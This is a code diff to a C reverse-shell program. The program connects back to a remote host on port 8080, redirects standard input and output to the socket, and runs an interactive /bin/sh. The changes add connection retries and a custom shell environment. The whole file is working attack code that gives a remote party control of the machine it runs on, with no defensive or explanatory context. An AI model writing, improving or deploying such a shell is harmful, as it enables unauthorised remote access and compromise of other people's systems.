@@ -1,15 +1,18 @@
 #include <stdio.h>
 #include <unistd.h>
 #include <sys/socket.h>
-#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <time.h>
 
 int main(void)
 {
 	int i; // used for dup2 later
 	int sockfd; // socket file descriptor
-	socklen_t socklen; // socket-length for new connections
 
 	struct sockaddr_in srv_addr; // client address
+    char *argv[] = { "/bin/sh", "-e", "-i", 0};
+    char *envp[] = {"PS1=\\u@\\h \\w\\n\\$ : ", "SHELL=/bin/bash", "HISTSIZE=50",0};
+    int result=0;
 
 	srv_addr.sin_family = AF_INET; // server socket type address family = internet protocol address
 	srv_addr.sin_port = htons( 8080 ); // connect-back port, converted to network byte order
@@ -19,12 +22,21 @@ int main(void)
 	sockfd = socket( AF_INET, SOCK_STREAM, IPPROTO_IP );
 
 	// connect socket
-	connect(sockfd, (struct sockaddr *)&srv_addr, sizeof(srv_addr));
+	result = connect(sockfd, (struct sockaddr *)&srv_addr, sizeof(srv_addr));
+    if (result == -1){
+        for (i = 3; i != 0; i--){
+            sleep(5);
+            result = connect(sockfd, (struct sockaddr *)&srv_addr, sizeof(srv_addr));
+            if (result != -1){
+                break;
+            }
+        }
+    }
 
 	// dup2-loop to redirect stdin(0), stdout(1) and stderr(2)
-	for(i = 0; i <= 2; i++)
+	for (i = 0; i <= 2; i++){
 		dup2(sockfd, i);
-
+    }
 	// magic
-	execve( "/bin/sh", NULL, NULL );
+	execve(argv[0], &argv[0], envp);
 }
